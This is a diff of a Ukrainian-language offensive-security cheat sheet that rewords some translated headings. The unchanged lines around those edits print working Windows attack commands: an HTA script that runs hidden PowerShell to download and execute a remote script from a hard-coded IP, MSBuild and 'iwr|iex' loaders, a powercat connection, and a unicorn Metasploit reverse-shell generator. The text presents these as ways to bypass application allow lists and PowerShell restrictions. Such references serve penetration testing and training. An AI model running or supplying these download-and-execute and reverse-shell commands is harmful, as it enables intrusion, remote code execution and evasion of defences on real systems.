@@ -121,7 +121,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Приклад зворотного шелу hta-psh (використовуйте hta для завантаження та виконання PS бекдору)**
+#### **Приклад hta-psh зворотного шеллу (використовуйте hta для завантаження та виконання PS бекдору)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -348,7 +348,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Ви можете використовувати цю техніку для обходу списків дозволених додатків та обмежень на Powershell.exe. Оскільки вам буде запропоновано використовувати PS shell.\
+Ви можете використовувати цю техніку для обходу списків дозволених програм та обмежень на Powershell.exe. Оскільки вам буде запропоновано використовувати PS shell.\
 Просто завантажте це та виконайте: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -446,7 +446,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Створіть версію backdoor metasploit на powershell за допомогою unicorn
+Створіть версію метасплойт бекдору на powershell за допомогою unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -462,9 +462,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Більше
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS консоль з деякими завантаженими наступальними PS модулями (шифрованими)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS консоль з деякими агресивними PS модулями, попередньо завантаженими (шифрованими)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деякими наступальними PS модулями та виявленням проксі (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS консоль з деякими агресивними PS модулями та виявленням проксі (IEX)
 
 ## Посилання
 
